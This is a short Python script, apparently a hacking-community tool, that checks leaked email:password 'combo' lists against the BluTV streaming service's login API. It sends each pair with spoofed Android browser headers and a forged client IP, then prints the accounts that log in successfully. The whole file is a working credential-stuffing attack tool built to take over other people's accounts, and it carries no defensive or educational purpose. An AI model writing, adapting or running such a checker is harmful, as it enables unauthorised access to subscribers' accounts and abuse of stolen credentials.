import requests
import os
try:
    from cfonts import render
except:
    os.system('pip install python-cfonts')

class RickLoginChecker:
    def __init__(self):
        self.url = "https://www.blutv.com/api/login"
        self.headers = {
            'authority': 'www.blutv.com',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'appcountry': 'TUR',
            'applanguage': 'tr-TR',
            'appplatform': 'com.blu',
            'content-type': 'text/plain;charset=UTF-8',
            'deviceresolution': '393x873',
            'origin': 'https://www.blutv.com',
            'referer': 'https://www.blutv.com/giris',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'userip': '188.57.45.192'
        }

    def login_check(self, email, password):
        json_data = {
            "email": email,
            "password": password,
            "remember": False,
        }
        response = requests.post(self.url, headers=self.headers, json=json_data)
        if "Lütfen e-posta adresi ve şifreni kontrol edip tekrar dene." in response.text:
            print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")
        elif "accessToken" in response.text:
            print(f"\033[2;32mBaşarılı Giriş ✅: {email}:{password}")
        else:
            print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")

    def rick_tool_from_file(self, combo_yolu):
        with open(combo_yolu, "r") as file:
            for line in file:
                email, password = line.strip().split(":")
                self.login_check(email, password)

output = render('    RICK     BLU TV ', colors=['white', 'blue'], align='center')
print(output)
combo_yolu = input("\033[2;35mCombo Yolu: ")

checker = RickLoginChecker()
checker.rick_tool_from_file(combo_yolu)
